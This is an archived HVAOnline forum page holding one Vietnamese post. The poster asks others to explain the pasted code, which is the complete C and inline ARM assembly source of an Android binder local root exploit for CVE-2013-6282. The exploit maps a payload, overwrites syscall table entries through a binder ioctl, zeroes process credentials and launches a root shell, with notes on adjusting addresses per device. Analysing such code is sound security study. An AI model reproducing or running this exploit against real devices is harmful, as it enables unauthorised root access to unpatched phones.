<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd"> 

<html>
<head>
<meta http-equiv="Content-Type" content="text/html;charset=UTF-8">
<meta http-equiv="Pragma" content="no-cache">
<meta http-equiv="Expires" content="-1">
<meta name="description" content="HVA discussion board">
<meta name="keywords" content="Messages posted by thánh rồi, jforum, jforum java, jforum forum, forum java, java jforum, java forum, forum, rafael steil, bulletin board, java bb, javabb, hva, hvaonline, hvazone, hvaforum">
<meta name="resource-type" content="document">
<meta name="distribution" content="global">
<meta name="robots" content="index,follow">
<meta name="rating" content="general">
<style type="text/css">
<!-- 
@import url( "http://www.hvaonline.net/hvaonline/templates/viet/styles/style.css");
-->
</style>
<style type="text/css">
<!--
@import url("http://www.hvaonline.net/hvaonline/templates/viet/styles/en_US.css");
-->
</style>
<title>Messages posted by thánh rồi - .:: HVAOnline ::.</title>

</head>
<body class="en_US">


<!--
Original theme from phpBB (http://www.phpbb.com) subSilver
Created by subBlue design
http://www.subBlue.com
Modifications by JForum Team 
Extended and customised by HVA Team
Added more features and Black Silver theme designed by HVA
-->
<table width="100%" border="0" cols="2">
	<tr align="right">
		<td class="copyright">
			English
			| 
			<a href="/hvaonline/jforum.html?module=forums&amp;action=setLang&amp;lang=vi_VN" rel="nofollow">Vietnamese</a>
		</td>
	</tr>
</table>
<table width="100%" border="0">
	<tr>
		<td>
			<table cellspacing="0" cellpadding="0" width="100%" border="0">
				<tr>			
        <td>&nbsp;
			</td>
		
        <td width="100%" align="center" valign="middle">
						<p><a href="http://www.hvaonline.net" title="[Logo]">
								<img src="http://www.hvaonline.net/hvaonline/templates/viet/images/hvabanner-final.gif" alt="banner" />
							<br>
            				</a><span class="maintitle"></span>
						</p>
          <table cellspacing="0" cellpadding="2" border="0">
							<tr>
								
              <td valign="top" nowrap="nowrap" align="center">
			  						<a href="/hvaonline/forums/rule.html"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_rule.gif" alt="[Rule]" title="[Rule]"></a>
									<a id="rule" class="topmenu" href="/hvaonline/forums/rule.html">Rules</a>&nbsp;
									
									<a class="topmenu" href="/hvaonline/forums/list.html"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_groups.gif" alt="[Home]" title="[Home]"></a>
										<a id="backtosite" class="topmenu" href="/hvaonline/forums/list.html">Main Forum</a>&nbsp;

										<a class="topmenu" href="/hvaonline/portal/list.html"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_portal.gif" alt="[Portal]" title="[Portal]"></a>
										<a id="portalsite" class="topmenu" href="/hvaonline/portal/list.html">Portal</a>&nbsp;&nbsp;
									<br>
									
										<a href="/hvaonline/user/list.html"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_members.gif" alt="[Members]" title="[Members]"></a>
										<a id="users" class="topmenu" href="/hvaonline/user/list.html">Member Listing</a>&nbsp;
										
										<a href="/hvaonline/forums/stats.html"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_stats.gif" alt="[Statistics]" title="[Statistics]"></a>
										<a id="stats" class="topmenu" href="/hvaonline/forums/stats.html">Statistics</a>&nbsp;
										
										<a href="/hvaonline/search/filters.html"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_search.gif" alt="[Search]" title="[Search]"></a>
										<span class="mainmenu"><a id="search" class="topmenu" href="/hvaonline/search/filters.html"><b>Search</b></a>&nbsp;
									
										<a href="/book/"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_book.gif" alt="[Reading Room]" title="[Reading Room]"></a> 
										<a class="topmenu" href="/hvaonline/readingRoom/list.html">Reading Room</a>&nbsp;

									
									<span class="topmenu"> 
										

	
										<br>
											<a id="register" class="topmenu" href="/hvaonline/user/insert.html"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_register.gif" border="0" alt="[Register]" title="[Register]"> 
												Register</a>&nbsp;&nbsp;</span>
											<img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_login.gif" border="0" alt="[Login]" title="[Login]"> 
											<strong>Login</strong> [&nbsp;
											<a id="login" class="topmenu" href="/hvaonline/user/login.html">http</a>&nbsp;
											|
											<a id="logins" class="topmenu" href="https://www.hvaonline.net/hvaonline/user/logins.html">https </a>&nbsp;]</span>
								</td>
							</tr>
							<tr>
								<td>&nbsp;</td>
							</tr>
						</table>
					</td>
				</tr>
			</table>
		</td>
	</tr>
	<tr>
		<td>

<script type="text/javascript" src="http://www.hvaonline.net/hvaonline/templates/viet/js/post_show.js"></script>
<script type="text/javascript" src="http://www.hvaonline.net/hvaonline/templates/viet/js/post.js"></script>
<script type="text/javascript">
<!--

function showEmail(beforeAt, afterAt)
{
	return beforeAt + "@" + afterAt;
}

var starOn=new Image();
starOn.src="http://www.hvaonline.net/hvaonline/templates/viet/images/star_on.gif";

var starOff=new Image();
starOff.src="http://www.hvaonline.net/hvaonline/templates/viet/images/star_off.gif";

function writeStars(q, postId)
{
	for (var i = 0; i < 5; i++) {
		var name = "star" + postId + "_" + i;
		document.write("<img name='" + name + "' alt='*' />");
		document.images[name].src = q > i ? starOn.src : starOff.src;
	}
}

function addBookmark(relationType, relationId)
{
	var w = window.open('/hvaonline/bookmarks/insert/' + relationType + '/' + relationId + '.html', 'bookmark_add', 'width="700", height="100", scrollbars="no"');
	w.focus();
}

function supportAjax()
{
	if (typeof(AjaxUtils) != 'undefined') {
		if (window.ActiveXObject) {
			var r = new ActiveXObject("Microsoft.XMLHTTP");
			return r != undefined;
		}
		else if (window.XMLHttpRequest) {
			return true;
		}
	}

	return false;
}

-->
</script>

<table cellspacing="0" cellpadding="10" width="98%" align="center" border="0">
	<tr>
		<td class="bodyline">
			<table cellspacing="2" cellpadding="2" width="100%" border="0">
				<tr>
					<td valign="middle" align="left" colspan="2">
						<span class="maintitle"><a href="/hvaonline/posts/listByUser/287826.html" name="top" class="maintitle" id="top">Messages posted by: thánh rồi</a></span>
						&nbsp;<a href="/hvaonline/rss/showPostsByUser/287826.html"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/xml_button.gif" border="0" alt="XML" /></a>
					</td>
				</tr>
			</table>
			
			<table cellspacing="2" cellpadding="2" width="100%" border="0">
				<tr>
					
					<td valign="middle" align="left" colspan="0">
						<span class="nav">
						<a href="/hvaonline/user/profile/287826.html">Profile for thánh rồi</a> 
            			<img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif"><a href="/hvaonline/posts/listByUser/287826.html">Messages posted by thánh rồi</a>
						</span>
					</td>
										
					<td valign="middle" align="right">
						<span class="nav">[ number of posts not being displayed on this page: <span class="moderator">0</span> ]</span>
					</td>
				</tr>
			</table>

			
      <table class="forumline" cellspacing="1" cellpadding="3" width="100%" border="0">
        <tr>
          <th height="26" nowrap="nowrap" class="thleft">&nbsp;</th>
        </tr>

				
        <!-- POST LISTING -->
         
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/13.html">Thông tin new bugs và exploits</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/45771.html">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/45771/281299.html#281299,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row1" valign="top">
			<span class="postbody">anh em có thể phân tích cho em nhiệm vụ của code này không ạ<br/> /*<br/> * Just a lame binder local root exploit stub. Somewhat messy but whatever. The bug was reported in CVE-2013-6282.<br/> *<br/> * Tested on Android 4.2.2 and 4.4. Kernels 3.0.57, 3.4.5 and few more. All up to 3.4.5 unpatched should be vulnerable.<br/> * You need to customize the addresses so that they match the target board. On Android, both /proc/kallsyms and dmesg are<br/> * restricted, thus no automation here.<br/> *<br/> * Rigged up by Piotr Szerman. (c) 2013<br/> *<br/> */<br/><br/> #include &lt;stdio.h&gt;<br/> #include &lt;stdlib.h&gt;<br/> #include &lt;string.h&gt;<br/> #include &lt;sys/stat.h&gt;<br/> #include &lt;sys/types.h&gt;<br/> #include &lt;sys/mman.h&gt;<br/> #include &lt;fcntl.h&gt;<br/> #include &lt;unistd.h&gt;<br/> #include &lt;errno.h&gt;<br/><br/> /* Binder transaction request format */<br/> struct binder_write_read {<br/> signed long write_size; /* bytes to write */<br/> signed long write_consumed; /* bytes consumed by driver */<br/> unsigned long write_buffer;<br/> signed long read_size; /* bytes to read */<br/> signed long read_consumed; /* bytes consumed by driver */<br/> unsigned long read_buffer;<br/> } bwr;<br/><br/> #define BR_NOOP 0x0000720c /* binder memory write value */<br/> #define SC_TABLE 0xc000ee28 /* system call table address */<br/> /* we need to know the lower halfword of the original address of sys_ni_syscall to tailor MMAP_AREA and MMAP_OFF accordingly.<br/> * you can aid yourself with a NOP block. the higher halfword will in any case become 0x720c. on one of my boxes, the other<br/> * halfword was 0xdac4. MMAP_AREA must be aligned appropriately. you can extract all the data in question at runtime from<br/> * /proc/kallsyms and dmesg (not that hard to set off infoleaks with this bug) as long as there are no contraints in place<br/> */<br/> #define MMAP_AREA 0x720cd000 /* userspace landing point page-aligned address. */<br/> #define MMAP_OFF 0xac4 /* offset within it to plant the payload */<br/> #define NUM_PAGES 16<br/> #define PAGE_SIZE 4096<br/> #define NOP 0xe1a00000 /* mov r0, r0 */<br/> #define SHELL &quot;/system/bin/sh&quot;<br/> #define TARGET_APERTURE 68 /* aiming for two adjacent non-implemented syscalls. check arch/arm/kernel/calls.S */<br/> #define BINDER_WRITE_READ 0xc0186201 /* printk your BINDER_WRITE_READ <img src="/hvaonline/images/smilies/068ae40523a24c9ef54edefd375e542d.gif" border="0" alt="smilie" align="absbottom"> */<br/><br/> /* the target payload */<br/> void __attribute__((regparm(3))) shellcode(void)<br/> {<br/> asm volatile(<br/><br/> &quot;__transgressor:;&quot;<br/> &quot;push {r0-r12,lr}&quot; &quot;\n\t&quot;<br/> &quot;mov r1, sp&quot; &quot;\n\t&quot; /* calculate the process descriptor location */<br/> &quot;bic r2, r1, #8128&quot; &quot;\n\t&quot;<br/> &quot;bic r2, r2, #63&quot; &quot;\n\t&quot;<br/> &quot;ldr r3, [r2, #12]&quot; &quot;\n\t&quot;<br/><br/> &quot;movt r0, #0&quot; &quot;\n\t&quot;<br/> &quot;movw r0, #0&quot; &quot;\n\t&quot;<br/><br/> &quot;ldr r1, [r3, #492]&quot; &quot;\n\t&quot; /* cred's location may differ depending on the kernel config.<br/> * just build and objdump a kernel module with printk(current-&gt;cred-&gt;uid)<br/> * to find out. or pinpoint it with the help of kgdb or whatever <img src="/hvaonline/images/smilies/068ae40523a24c9ef54edefd375e542d.gif" border="0" alt="smilie" align="absbottom"><br/> */<br/> &quot;mov r4, #8&quot; &quot;\n\t&quot;<br/> &quot;__loop_cred:;&quot;<br/> &quot;sub r4, r4, #1&quot; &quot;\n\t&quot;<br/> &quot;str r0, [r1, #4]!&quot; &quot;\n\t&quot;<br/> &quot;teq r4, #0&quot; &quot;\n\t&quot;<br/> &quot;bne __loop_cred&quot; &quot;\n\t&quot;<br/><br/> &quot;ldr r1, [r3, #488]&quot; &quot;\n\t&quot; /* real_cred. overkill? */<br/> &quot;mov r4, #8&quot; &quot;\n\t&quot;<br/> &quot;__loop_real_cred:;&quot;<br/> &quot;sub r4, r4, #1&quot; &quot;\n\t&quot;<br/> &quot;str r0, [r1, #4]!&quot; &quot;\n\t&quot;<br/> &quot;teq r4, #0&quot; &quot;\n\t&quot;<br/> &quot;bne __loop_real_cred&quot; &quot;\n\t&quot;<br/><br/> &quot;ldm sp!, {r0-r12,pc}&quot; &quot;\n\t&quot; /* return to ret_fast_syscall */<br/> &quot;mov pc, lr&quot; &quot;\n\t&quot;<br/> );<br/> }<br/><br/> int<br/> main(int ac, char **av)<br/> {<br/> char * const shell[] = { SHELL, NULL };<br/> char *map;<br/> int fd;<br/><br/> fprintf(stderr, &quot;[!] binder local root exploit\n[!] (c) piotr szerman\n&quot<img src="/hvaonline/images/smilies/068ae40523a24c9ef54edefd375e542d.gif" border="0" alt="smilie" align="absbottom">;<br/><br/> fd = open(&quot;/dev/binder&quot;, O_RDWR);<br/><br/> if(fd &lt; 0)<br/> {<br/> fprintf(stderr, &quot;[-] failed to reach out for binder. (%s)\n&quot;, strerror(errno));<br/> exit(EXIT_FAILURE);<br/> }<br/><br/> map = mmap((void *)MMAP_AREA, NUM_PAGES * PAGE_SIZE, PROT_READ | PROT_WRITE | PROT_EXEC,<br/> MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED | MAP_LOCKED, 0, 0);<br/><br/> if(map == (void *)-1)<br/> {<br/> perror(&quot;mmap() &quot<img src="/hvaonline/images/smilies/068ae40523a24c9ef54edefd375e542d.gif" border="0" alt="smilie" align="absbottom">;<br/> exit(EXIT_FAILURE);<br/> }<br/><br/> fprintf(stderr, &quot;[+] userspace map area == 0x%08lx\n&quot;, (unsigned long)map);<br/><br/> fprintf(stderr, &quot;[+] placing NOP block at 0x%08lx\n&quot;, (unsigned long)map);<br/> memset(map, NOP, MMAP_OFF);<br/> fprintf(stderr, &quot;[+] copying payload to 0x%08lx\n&quot;, (unsigned long)map + MMAP_OFF);<br/> /* look at the objdump of shellcode to see the correct offset */<br/> memcpy(map + MMAP_OFF, (unsigned char *)shellcode + 8 /* offseting to the __transgressor */, 30 * sizeof(void *) /* copy all opcodes */);<br/><br/> fprintf(stderr, &quot;[+] constructing rogue data structure.\n&quot<img src="/hvaonline/images/smilies/068ae40523a24c9ef54edefd375e542d.gif" border="0" alt="smilie" align="absbottom">;<br/><br/> bwr.write_size = 0;<br/> bwr.write_consumed = 0;<br/> bwr.read_size = 1;<br/> bwr.read_consumed = 0;<br/> /* targeting the aperture between 2 undefined system calls in the table */<br/> bwr.read_buffer = (unsigned long)((unsigned char *)SC_TABLE + TARGET_APERTURE * sizeof(void *) + 2);<br/><br/> /* calculate process descriptor address with the aid of sp:<br/> * task_struct = *( ((unsigned long *) ( (sp & ~(0xbf000000 - 1)) & ~0x3f )) + 3);<br/> */<br/><br/> ioctl(fd, BINDER_WRITE_READ, &bwr);<br/> close(fd);<br/><br/> sleep(5); /* give binder ample time to service the transaction. if it's under heavy load, the exploit might fail */<br/><br/> fprintf(stderr, &quot;[+] r00ting device...\n\n&quot<img src="/hvaonline/images/smilies/068ae40523a24c9ef54edefd375e542d.gif" border="0" alt="smilie" align="absbottom">;<br/><br/> asm volatile(<br/> &quot;mov r7, %0\n\t&quot;<br/> &quot;swi 0\n\t&quot;<br/> : : &quot;I&quot; (TARGET_APERTURE)<br/> );<br/><br/> execve(shell[0], shell, NULL);<br/><br/> return EXIT_FAILURE;</span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
				
        <!-- END OF POST LISTING -->
			
				

			
      </table>
		
			<table cellspacing="2" cellpadding="2" width="100%" align="center" border="0">
				<tr>					
					
					<td valign="middle" align="left" colspan="0">
						<span class="nav">
						&nbsp;
						</span>
					</td>

					<td valign="middle" align="right"></td>
				</tr>
				
				<tr>
					<td colspan="3"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
				</tr>			
			</table>
		</td>
	</tr>
</table>


	<tr>	
		<td align="center">
		<br>
					</td>
	</tr>

	<tr>
		<td align="center">
			<span class="copyright">Powered by JForum - Extended by <a href="MailTo:lienlac@hvaonline.net">HVAOnline</a><br>
			&nbsp;hvaonline.net&nbsp; | &nbsp;hvaforum.net&nbsp; | &nbsp;hvazone.net&nbsp; | &nbsp;hvanews.net&nbsp; | &nbsp;vnhacker.org<br>
			1999 - 2013 &copy;
			v2012|0504|218|
		  </span>
	  </td>
	</tr>
<iframe src="/hvaonline/templates/ping_session.jsp" height="0" width="0" frameborder="0" scrolling="no"></iframe>
</body>
</html>
